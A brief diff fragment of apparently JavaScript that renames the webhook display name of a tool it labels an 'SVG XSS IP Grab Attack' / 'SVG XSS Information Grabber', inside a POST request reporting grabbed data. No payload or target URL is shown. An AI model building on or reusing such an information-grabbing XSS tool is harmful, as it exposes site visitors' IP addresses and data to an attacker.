@@ -38,7 +38,7 @@
             method:"POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-               username: "SVG XSS IP Grab Attack",
+               username: "SVG XSS Information Grabber by SSSEAL-C on Github",
                avatar_url: "https://i.imgur.com/Yztlbk4.png",
                embeds: [
                { 
